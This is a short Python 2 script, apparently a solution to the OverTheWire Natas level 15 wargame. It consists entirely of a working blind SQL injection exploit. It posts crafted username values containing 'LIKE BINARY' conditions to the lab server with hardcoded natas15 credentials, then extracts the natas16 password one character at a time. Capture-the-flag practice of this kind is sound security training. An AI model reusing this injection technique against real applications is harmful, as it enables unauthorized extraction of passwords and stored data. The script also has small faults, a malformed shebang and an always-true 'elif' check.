#!/usr/env python2
import sys
import requests
import string
from requests.auth import HTTPBasicAuth


MSG_OK = "This user exists."
MSG_ERROR = "This user doesn't exist."

url = "http://natas15.natas.labs.overthewire.org/index.php?debug"
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
passwd = ''
filtred = ''
for char in chars:
    my_data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}

    a = requests.post(url, auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = my_data)
    if MSG_OK in a.text:
        filtred = filtred +char



for i in range(0,32):
    for char in filtred:
        my_data = {'username' : 'natas16" and password LIKE BINARY "' + passwd+  char + '%" #'}

        a = requests.post(url, auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = my_data)
        if MSG_OK in a.text:
            
            passwd = passwd + char
            print(passwd)
            sys.stdout.flush()
            break
        elif MSG_ERROR:
            sys.stdout.write('.')
            sys.stdout.flush()
            continue

